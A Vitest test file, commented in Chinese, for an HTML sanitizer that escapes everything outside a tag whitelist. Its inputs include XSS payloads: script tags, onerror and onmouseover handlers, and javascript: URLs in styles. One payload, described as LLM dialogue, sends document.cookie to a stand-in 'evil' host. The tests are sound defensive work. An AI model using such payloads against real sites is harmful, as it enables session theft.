import { describe, expect, it } from 'vitest';
import { esc, rich } from '@/events/EventBus';

/* F-01 验收：受限富文本出口只放行白名单标签，其余一律以实体文本呈现 */
describe('rich · 受限富文本出口', () => {
  it('script 标签被转义，不产生可执行标签', () => {
    const out = rich('<script>alert(1)</script>');
    expect(out).not.toContain('<script');
    expect(out).toContain('&lt;script&gt;');
  });

  it('事件属性标签整体保持转义（img/onerror）', () => {
    const out = rich('<img src=x onerror=alert(1)>');
    expect(out).not.toContain('<img');
    expect(out).toContain('&lt;img');
  });

  it('br 与 b/i/em 保留', () => {
    expect(rich('一行<br>二行')).toBe('一行<br>二行');
    expect(rich('<b>粗</b>')).toBe('<b>粗</b>');
    expect(rich('<i>斜</i>')).toBe('<i>斜</i>');
    expect(rich('<em>强调</em>')).toBe('<em>强调</em>');
    expect(rich('断行<br/>续')).toBe('断行<br>续');
  });

  it('span/div 的 class 与 style 保留（既有排版零回归）', () => {
    expect(rich('<span class="ok">是</span>')).toBe('<span class="ok">是</span>');
    expect(rich('<span style="color:var(--crimson)">深层</span>')).toBe('<span style="color:var(--crimson)">深层</span>');
    expect(rich('<div class="weigh"><b>权衡</b></div>')).toBe('<div class="weigh"><b>权衡</b></div>');
  });

  it('白名单标签上的未知属性使该标签保持转义', () => {
    const out = rich('<span class="ok" onmouseover="alert(1)">x</span>');
    expect(out).not.toContain('<span class="ok" onmouseover');
    expect(out).toContain('&lt;span');
  });

  it('style 内的 url()/expression()/javascript: 一律拒绝', () => {
    expect(rich('<span style="background:url(javascript:alert(1))">x</span>')).toContain('&lt;span');
    expect(rich('<span style="width:expression(alert(1))">x</span>')).toContain('&lt;span');
    expect(rich('<span style="background:url(http://x/a.png)">x</span>')).toContain('&lt;span');
  });

  it('style 内的字体与字距一律拒绝（字体统一：正文字体由 --serif 令牌承担）', () => {
    expect(rich('<span style="font-family:KaiTi">x</span>')).toContain('&lt;span');
    expect(rich('<span style="font:14px KaiTi">x</span>')).toContain('&lt;span');
    expect(rich('<span style="font-style:italic">x</span>')).toContain('&lt;span');
    expect(rich('<span style="letter-spacing:.3em">x</span>')).toContain('&lt;span');
    /* 字重与颜色仍放行：强调的合法通道 */
    expect(rich('<span style="font-weight:700">x</span>')).toBe('<span style="font-weight:700">x</span>');
    expect(rich('<span style="color:var(--gold2)">x</span>')).toBe('<span style="color:var(--gold2)">x</span>');
  });

  it('与 esc 一致：& < > " 全部转义', () => {
    expect(esc('a & b')).toBe('a &amp; b');
    expect(rich('a & b')).toBe('a &amp; b');
  });

  it('LLM 台词载荷穿不过出口（只留转义文本，无可解析标签）', () => {
    const payload = '“<img src=x onerror=fetch(\'http://evil/\'+document.cookie)>”';
    const out = rich(payload);
    expect(out).not.toContain('<img');
    expect(out).toContain('&lt;img');
    // 转义后的属性文本可以被看到，但浏览器不会把它解析成属性
    expect(out.replace(/&lt;[^&]*&gt;/g, '')).not.toContain('<');
  });
});
